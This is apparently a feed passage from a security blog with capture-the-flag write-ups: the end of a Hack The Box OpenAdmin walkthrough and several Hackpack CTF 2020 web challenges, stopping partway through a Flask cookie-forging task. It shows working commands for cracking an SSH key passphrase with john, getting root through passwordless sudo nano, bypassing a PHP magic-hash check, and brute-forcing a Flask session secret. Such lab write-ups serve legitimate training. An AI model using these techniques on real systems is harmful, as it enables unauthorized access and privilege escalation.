&lt;span class="code-line"&gt;piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/&lt;/span&gt;
&lt;span class="code-line"&gt;/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH&lt;/span&gt;
&lt;span class="code-line"&gt;40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ&lt;/span&gt;
&lt;span class="code-line"&gt;fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb&lt;/span&gt;
&lt;span class="code-line"&gt;9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80&lt;/span&gt;
&lt;span class="code-line"&gt;X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg&lt;/span&gt;
&lt;span class="code-line"&gt;S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F&lt;/span&gt;
&lt;span class="code-line"&gt;FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh&lt;/span&gt;
&lt;span class="code-line"&gt;Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa&lt;/span&gt;
&lt;span class="code-line"&gt;RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z&lt;/span&gt;
&lt;span class="code-line"&gt;uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr&lt;/span&gt;
&lt;span class="code-line"&gt;1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2&lt;/span&gt;
&lt;span class="code-line"&gt;XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79&lt;/span&gt;
&lt;span class="code-line"&gt;yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM&lt;/span&gt;
&lt;span class="code-line"&gt;+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt&lt;/span&gt;
&lt;span class="code-line"&gt;qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt&lt;/span&gt;
&lt;span class="code-line"&gt;z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe&lt;/span&gt;
&lt;span class="code-line"&gt;K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We see that the key is password protected (second line of the key) so we use
&lt;code&gt;ssh2john&lt;/code&gt; to convert the key to a crackable hash. Then we run john on it using
the rockyou wordlist. We crack the &lt;code&gt;bloodninjas&lt;/code&gt; password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
&lt;span class="code-line"&gt;$ john id_rsa.hash -w=tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;bloodninjas      (id_rsa)&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2020-01-07 15:25) 0.2087g/s 2994Kp/s 2994Kc/s 2994KC/s *7¡Vamos!&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect as &lt;code&gt;joanna&lt;/code&gt; using SSH.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh joanna@10.10.10.171 -i /tmp/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/tmp/id_rsa&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;joanna@openadmin:~$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;joanna@openadmin:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;c9b2cf07d40807e62af62660f0c81b5f&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;We start enumerating the box and found that we have the &lt;code&gt;sudo&lt;/code&gt; right without
password on &lt;code&gt;/bin/nano /op/priv/&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;joanna@openadmin:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for joanna on openadmin:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User joanna may run the following commands on openadmin:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /bin/nano /opt/priv&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A quick look at &lt;a href="https://gtfobins.github.io/gtfobins/nano/"&gt;GTFObins&lt;/a&gt; show us
that we can execute commands in nano with &amp;lt;^R^X&amp;gt;. We just run &lt;code&gt;id&lt;/code&gt; and &lt;code&gt;cat
/root/root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GNU nano 2.9.3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;2f907ed450b361b2c2bf4e8795d5b561&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This was a really easy box with almost no rabbit hole. I will recommend this box
for the beginner until it retires (of course this article will be publish after
its retirement).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="openAdmin"></category><category term="sudo"></category><category term="nano"></category></entry><entry><title>Hackpack CTF 2020</title><link href="https://maggick.fr/2020/04/hackpack-ctf-2020.html" rel="alternate"></link><published>2020-04-28T08:50:00+02:00</published><updated>2020-04-28T08:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-28:/2020/04/hackpack-ctf-2020.html</id><summary type="html">&lt;p&gt;&lt;img alt="Hackpack CTF logo" class="align-left" src="/media/2020.04/hackpack_logo.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This weekend I participate to the Hackpack CTF with the team &lt;code&gt;hackers for the jilted generation&lt;/code&gt;
(mostly me this time). We finished 126th with 811 points.
Here are some writeup about the challenges.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/hackpack_logo.png" alt="Hackpack CTF logo" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This weekend I participate to the Hackpack CTF with the team &lt;code&gt;hackers for the jilted generation&lt;/code&gt;
(mostly me this time). We finished 126th with 811 points.
Here are some writeup about the challenges.&lt;/p&gt;


&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;h2 id="treasure-map"&gt;Treasure Map&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hmm, do pirates really think they can hide a treasure without us knowing? Find the treasure and prove they are wrong. Check here: https://treasure-map.cha.hackpack.club/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The webpage contain the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Treasure of the Pirates!&lt;/span&gt;
&lt;span class="code-line"&gt;It should in some of this (or hidden) island!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Hint: you need a map of this place to find it!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Island #0&lt;/span&gt;
&lt;span class="code-line"&gt;Island #1&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Island #9998&lt;/span&gt;
&lt;span class="code-line"&gt;Island #9999&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We are looking for the map. We check &lt;code&gt;robots.txt&lt;/code&gt;: it contains: &lt;code&gt;Sitemap: /treasuremap.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The file &lt;code&gt;/treasuremap.xml&lt;/code&gt; contain the location of the "treasure":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;urlset&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;url&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;loc&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;7BmqJfhWhEa30NeVj7j2.html&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;loc&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;lastmod&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;2005-01-01&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;lastmod&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;changefreq&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;monthly&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;changefreq&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;priority&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;0.8&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;priority&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;url&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;urlset&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And the "treasure" contain the flag: &lt;code&gt;flag{tr3asur3_hunt1ng_fUn}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="super-secret-flag-vault"&gt;Super Secret Flag Vault&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;See if you can get into the super secret flag vault! I have used the latest and greatest techniques with php to make sure you cant get past my vault.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The &lt;code&gt;index.php&lt;/code&gt; file is available:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="c1"&gt;// this is how I store hashes right?&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="nv"&gt;$hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0e770334890835629000008642775106&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;combination&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;combination&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="c1"&gt;//Isn&amp;#39;t it great that == works in every language?&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;br&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;combination&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;combination&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;br&amp;gt; The Flag is flag{...}&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;br&amp;gt;Wrong!&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The value of hash is just a number using scientific notation. This is a &lt;a href="https://www.php.net/manual/en/language.operators.comparison.php"&gt;php loose
comparison&lt;/a&gt;.
Using a input that will also be considered as a number will set the condition to true.
We use &lt;code&gt;240610708&lt;/code&gt;, which md5 hash is &lt;code&gt;0e462097431906509019562988736854&lt;/code&gt;, as a
password and we got the flag.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Flag is flag{!5_Ph9_5TronGly_7yPed?}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="paster"&gt;Paster&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Come and BETA Test our new social networking site. Its like twitter but shorter
Go checkout Paster now&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The site looks like the following:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Paster" src="/media/2020.04/hackpack_paster.png"&gt;&lt;/p&gt;
&lt;p&gt;When looking at the downloaded content we fount that the file
&lt;code&gt;frames/game-frame.js&lt;/code&gt; is downloaded. It contains 248 311 characters as the
following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+&lt;/span&gt;
&lt;span class="code-line"&gt;(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+&lt;/span&gt;
&lt;span class="code-line"&gt;[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])&lt;/span&gt;
&lt;span class="code-line"&gt;[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+&lt;/span&gt;
&lt;span class="code-line"&gt;(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is &lt;a href="http://www.jsfuck.com/"&gt;JSfuck&lt;/a&gt;. We use an
&lt;a href="https://enkhee-osiris.github.io/Decoder-JSFuck/"&gt;online decoder&lt;/a&gt; to decode it.
The output is some clear JavaScript.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;postMessage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;originalAlert&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;t&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="nx"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;postMessage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;success&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nx"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;atob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;originalAlert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Congratulations, you executed an alert:\n\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;t&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;\n\nhere is the flag: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;)},&lt;/span&gt;&lt;span class="mf"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)};&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We where probably supposed to do some XSS to get the flag but we got it either
way.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ echo -ne &amp;#39;ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99&amp;#39; | base64 -d&lt;/span&gt;
&lt;span class="code-line"&gt;flag{x55_i5Nt_7hA7_bAD_R1Gh7?}[&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="cookie-forge"&gt;Cookie Forge&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Help a new local cookie bakery startup shake down their new online ordering and loyalty rewards portal at https://cookie-forge.cha.hackpack.club!&lt;/p&gt;
&lt;p&gt;I wonder if they will sell you a Flask of milk to go with your cookies...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The website is using flask. A page is reserved for premium member.&lt;/p&gt;
&lt;p&gt;We know that &lt;a href="https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce"&gt;flask cookie have some issues&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We place an order. Login as &lt;code&gt;toto:toto&lt;/code&gt; get the cookie and pass it to
&lt;code&gt;flask-unsign&lt;/code&gt;. The tool can decode it as the secret is only use to sign the
cookie.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$flask-unsign -d -c &amp;#39;eyJmbGFnc2hpcCI6ZmFsc2UsInVzZXJuYW1lIjoidG90byJ9.Xp2SeA.1l6nDFaIsDZ8bCXcxdtORRVIBK0&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;#39;flagship&amp;#39;: False, &amp;#39;username&amp;#39;: &amp;#39;toto&amp;#39;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need to get the secret to forge our own cookie&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ flask-unsign --server https://cookie-forge.cha.hackpack.club/orders --unsign&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Server returned HTTP 302 (Found)&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Successfully obtained session cookie: eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIllvdSBtdXN0IGxvZyBpbiBmaXJzdCEiXX1dfQ.Xp2TwA.IiGnkGfSx0j-O_vLTjmUyU95zLQ&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Session decodes to: {&amp;#39;_flashes&amp;#39;: [(&amp;#39;warning&amp;#39;, &amp;#39;You must log in first!&amp;#39;)]}&lt;/span&gt;
&lt;span class="code-line"&gt;[*] No wordlist selected, falling back to default wordlist..&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Starting brute-forcer with 8 threads..&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Found secret key after 39090 attempts&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;password1&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We modify the &lt;code&gt;flagship&lt;/code&gt; value and sign our cookie with the secret &lt;code&gt;password1&lt;/code&gt;&lt;/p&gt;
